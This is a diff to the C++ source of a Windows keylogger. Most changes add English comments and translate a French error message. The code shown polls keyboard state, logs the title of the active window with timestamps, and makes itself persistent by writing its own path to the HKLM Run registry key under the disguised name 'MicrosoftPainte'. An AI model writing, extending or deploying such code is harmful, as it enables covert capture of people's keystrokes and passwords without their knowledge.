@@ -26,6 +26,7 @@ void Window(void)
 	GetWindowTextA(app, iss, 200);
 	cout << "[" << hour << ":" << minute << ":" << seconds << "]" << " " << iss << "\n";
 }
+// Log all keys delai => allows you to reduce or increase the delay between each check
 void Keylogger(int delai) {
 		if (GetKeyState('A') & 0x8000) {
 
@@ -294,11 +295,11 @@ int main()
 
 	 ShowWindow(console, SW_SHOW);
 
-	
+	// Show window
 	system("title Keylogger");
 	string path;
 	wstring newPath = L"";
-
+// Declarations variables path and newPath => Regedit
 	HMODULE hModule = NULL;
 	char Path[MAX_PATH];
 	GetModuleFileNameA(
@@ -320,29 +321,32 @@ int main()
 			newPath += path[i];
 		}
 	}
+	// Add to the path double slash \\
 
 	HKEY key = NULL;
 	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
-	if (res == ERROR_SUCCESS) {
+	// Open Regedit
+	if (res == ERROR_SUCCESS) { // Check if sucess
 		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size()+1) * sizeof(wchar_t));
+		// Write values
 		if (res == ERROR_SUCCESS) {
+			// Print Sucess if it Sucess !
 			cout << "Sucess! \n";
 		}
 		else {
+			// Print Error if it doesn't work
 			cout << "Error! \n";
 		}
 	}
 	else {
-		cout << "Pas bon \n";
+		// If he can't open the register
+		cout << "Not working \n";
 	}
 
 
 	while (true)
 	{
-
-		// Window();
-	Keylogger(100);
-		
-		
+	// In development
+	Keylogger(100);	
 	}
 }
